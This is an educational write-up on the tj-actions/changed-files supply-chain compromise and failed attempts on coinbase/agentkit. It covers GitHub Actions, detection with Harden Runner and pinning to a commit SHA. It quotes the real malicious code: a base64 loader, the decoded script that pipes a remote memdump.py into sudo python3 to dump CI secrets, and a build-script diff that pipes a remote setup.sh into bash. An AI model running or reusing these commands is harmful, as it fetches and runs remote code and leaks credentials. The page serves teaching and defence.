---
title: Real Example 2
---

## Coinbase and TJ-Actions

Third-party libraries are pre-built components that developers can integrate into their projects to simplify complex tasks and speed up development. However, they come with inherent risks, as they are created and maintained outside the project. If third-party libraries are not maintained properly, they can introduce vulnerabilities that can be exploited by malicious users.

To understand the risks associated with third-party libraries, we will explore a real example involving `coinbase/agentkit` and `tj-actions/changed-files`. Agentkit is a toolkit so AI agents can interact with blockchain networks. In this real example, we will learn how an attacker compromised `tj-actions/changed-files` in an attempt to compromise Coinbase.

## Github Actions

In software development, continuous integration and continuous delivery (CI/CD) is a common practice designed to improve software quality and delivery speed. GitHub Actions is a popular tool for implementing CI/CD pipelines. It allows developers to automate workflows, like building, testing, and deploying projects, all within the GitHub ecosystem.

In GitHub Actions, a workflow is a set of instructions defined in a YAML file that can respond to specific triggers, like a code push or pull request. For example, this workflow will run when a change is made to the main branch.

```yaml
name: Example

on:
  push:
    branches:
      - main
```

A workflow can complete many different tasks and also include third-party actions to simplify complex tasks. For example, a Node.js project will often include `actions/setup-node` to set up Node.js with a specific version.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Check out code
        uses: actions/checkout@v3
      
      - name: Set up Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
```

GitHub Actions are widely used because they are easy to integrate and are flexible, but they also introduce risks. Since third-party actions can be sourced from community contributions, improper maintenance or malicious changes to these actions can compromise projects relying on them.

## `tj-actions/changed-files`

![image](https://www.datocms-assets.com/75231/1742563341-coinbase-timeline-updated.png?dpr=0.75&fm=webp)

The GitHub Action `tj-actions/changed-files` is designed to track all changed files and directories. This action is particular useful for workflows where specific tasks need to be executed based on changes made to the repository. For example, `vitejs/vite` uses this action to automate testing.

However, an attacker compromised a Personal Access Token (PAT) linked to a bot account used to maintain the repository. This gave the attacker access to push malicious code and update the release tags to use their changes. The malicious code was encoded in base64 and decoded at runtime as `run.sh`.

```typescript
async function updateFeatures(token) {
   
     const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', `echo "aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25pa2l0YXN0dXBpbi8zMGU1MjViNzc2YzQwOWUwM2MyZDZmMzI4ZjI1NDk2NS9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=" | base64 -d > /tmp/run.sh && bash /tmp/run.sh`], {
         ignoreReturnCode: true,
         silent: true
     });
     core.info(stdout);
     
 }
```

The point of this script was to download and run a Python script that can dump all CI/CD secret credentials into GitHub Action's workflow log files. If these log files are publicly accessible, then anyone could read these secrets.

```bash
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
  echo $B64_BLOB
else
  exit 0
fi
```

For example, a repository using the vulnerable `tj-actions/changed-files` might see their secret credentials in their workflow log files.

![image](https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4cca074c5030ca60fd281_Screenshot%202025-03-14%20at%205.39.11%E2%80%AFPM.avif)

## `coinbase/agentkit`

In the context of `coinbase/agentkit`, the `tj-actions/changed-files` incident was one of many unsuccessful attempts to compromise the Coinbase repository. For example, in an earlier attempt the attacker managed to modify the build step in `coinbase/agentkit` to run a script.

```diff
"scripts": {
-    "build": "tsc",
+    "build": "tsc && curl -sSfL https://gist.githubusercontent.com/mmvojwip/bed37c8e5df4404cf04e183f5080861a/raw/setup.sh | bash && exit 1",
    "lint": "eslint -c .eslintrc.json \"src/**/*.ts\"",
    "lint:fix": "eslint -c .eslintrc.json \"src/**/*.ts\" --fix",
    "format": "prettier -c .prettierrc --write \"**/*.{ts,js,cjs,json,md}\"",
```

When that failed, they looked at dependencies that `coinbase/agentkit` relied on. One of which was `tj-actions/changed-files`. By compromising this GitHub action, the attacker was not only able to target Coinbase, but also over 23,000 repositories that relied on this action. Although the attack on Coinbase was unsuccessful, many other repositories had their secret credentials leaked in the public workflow log files.

## Proof of Concept

To better understand how users were impacted, we can use a security monitor like Harden Runner. We start by creating a workflow with `tj-actions/changed-files` and `step-security/harden-runner`.

```yaml
name: "tj-action changed-files incident"
jobs:
  changed_files:
   ....
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          disable-sudo: true
          egress-policy: audit
     ...
      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@v35
     ...
```

When this workflow is executed, Harden Runner will recognize malicious behavior from `tj-actions/changed-files` and flag it as `Anomalous`.

![image](https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a976992a1fec9f2f5fdf_Screenshot%202025-03-14%20at%203.10.33%E2%80%AFPM.avif)

We can learn more about the malicious behavior in the insights page and observe how the compromised `tj-actions/changed-files` downloads and executes a Python script. This will dump any secret credentials it finds.

![image](https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a9a39b13e0353099df3c_Screenshot%202025-03-14%20at%203.10.14%E2%80%AFPM.avif)

## Mitigations

To address the attacks done on `tj-actions/changed-files`, the maintainers removed all traces of the malicious code from their repository. They also fixed their release tags so they point to the correct versions.

For the users affected by the attack, secure forks of the action were made available as they waited for an official update. When the update was released, it was recommended that users pin the action to a full length commit SHA, so they are not at risk if the tags are modified by an attacker.

```diff
jobs:
  changed_files:
    runs-on: ubuntu-latest
      - name: Get changed files
        id: changed-files
-        uses: tj-actions/changed-files@v35.7.2
+        uses: tj-actions/changed-files@9328bab880abf4acc377d77718d28c6ac167f154 # v35.7.2
      ...
```

The real example involving Coinbase and TJ-Actions demonstrates how third-party libraries can introduce vulnerabilities that compromise the application. By staying on top of updates and security patches on the libraries we use, we can protect our applications from similar threats.
